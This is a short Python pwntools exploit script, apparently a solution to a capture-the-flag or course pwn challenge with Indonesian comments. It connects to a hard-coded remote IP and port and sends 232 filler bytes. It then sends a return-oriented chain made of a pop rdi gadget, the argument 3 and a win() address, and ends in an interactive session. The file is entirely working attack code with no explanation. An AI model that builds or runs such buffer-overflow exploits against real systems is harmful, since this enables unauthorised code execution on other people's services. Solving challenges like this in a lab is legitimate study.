from pwn import *

#p = process("3")
p = remote('52.184.85.16', 12345)
p.sendline("13523111")
p.sendline("3")

win_addr = 0x40153C  # Ganti dengan alamat win() yang sebenarnya
pop_rdi_ret = 0x40153A
payload = b"A" * 232

payload += struct.pack('<Q', pop_rdi_ret)  # alamat gadget
payload += struct.pack('<Q', 3)           # argumen a1
payload += struct.pack('<Q', win_addr)    # 0x40153C

#payload = b"A" * 240
#payload += b"\x3c\x15\x40\x00\x00\x00\x00\x00"

p.sendline(payload) 
p.interactive()